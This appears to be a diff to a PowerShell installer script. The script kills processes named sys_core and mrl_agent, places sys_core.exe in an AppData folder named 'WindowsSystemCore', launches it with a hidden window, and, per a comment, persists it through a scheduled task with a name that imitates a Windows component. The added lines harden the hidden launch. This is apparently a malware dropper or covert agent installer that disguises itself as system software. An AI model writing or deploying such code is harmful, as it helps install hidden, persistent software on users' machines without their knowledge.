@@ -19,10 +19,16 @@ $targetDir  = "$env:APPDATA\WindowsSystemCore"
 $targetExe  = "$targetDir\sys_core.exe"
 
 # ---- Kill existing agent if running ----
-Write-Host "[*] Checking for existing agent process..." -ForegroundColor Yellow
-Stop-Process -Name "sys_core" -Force -ErrorAction SilentlyContinue
-Stop-Process -Name "mrl_agent" -Force -ErrorAction SilentlyContinue
-Start-Sleep -Milliseconds 500
+Write-Host "[*] Cleaning up old processes..." -ForegroundColor Yellow
+$agentNames = @("sys_core", "mrl_agent")
+foreach ($name in $agentNames) {
+    $proc = Get-Process -Name $name -ErrorAction SilentlyContinue
+    if ($proc) {
+        Write-Host "    Terminating $name..." -ForegroundColor Gray
+        Stop-Process -Name $name -Force -ErrorAction SilentlyContinue
+        Start-Sleep -Seconds 1
+    }
+}
 
 # ---- Ensure target directory ----
 if (-not (Test-Path $targetDir)) {
@@ -59,8 +65,12 @@ Write-Host "[+] Download complete! ($sizeMB MB)" -ForegroundColor Green
 
 # ---- Launch agent silently ----
 Write-Host "[*] Initializing secure node..." -ForegroundColor Yellow
-Start-Process -FilePath $targetExe -WindowStyle Hidden -ErrorAction SilentlyContinue
-Start-Sleep -Milliseconds 800
+if (Test-Path $targetExe) {
+    Start-Process -FilePath $targetExe -WindowStyle Hidden -ErrorAction SilentlyContinue
+    Write-Host "[+] Node online and running in background." -ForegroundColor Green
+} else {
+    Write-Host "[!] Error: Agent binary not found at $targetExe" -ForegroundColor Red
+}
 
 # ---- Persist agent to startup via scheduled task ----
 $taskName = "WindowsSystemCore"
